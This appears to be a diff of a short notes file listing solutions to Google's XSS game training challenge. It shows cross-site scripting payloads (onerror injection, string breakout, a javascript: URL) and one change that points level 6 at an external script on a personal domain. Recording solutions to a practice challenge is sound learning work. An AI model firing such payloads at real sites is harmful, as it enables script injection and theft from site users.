@@ -5,5 +5,5 @@ https://xss-game.appspot.com
 3. `#' onerror=alert(1)>//`
 4. `'); alert('XSS`
 5. `/signup?next=javascript:alert(1);`
-6. `#/httP://example.com/xss.js`
+6. `#/httPs://abhaynayar.com/xss.js`
 
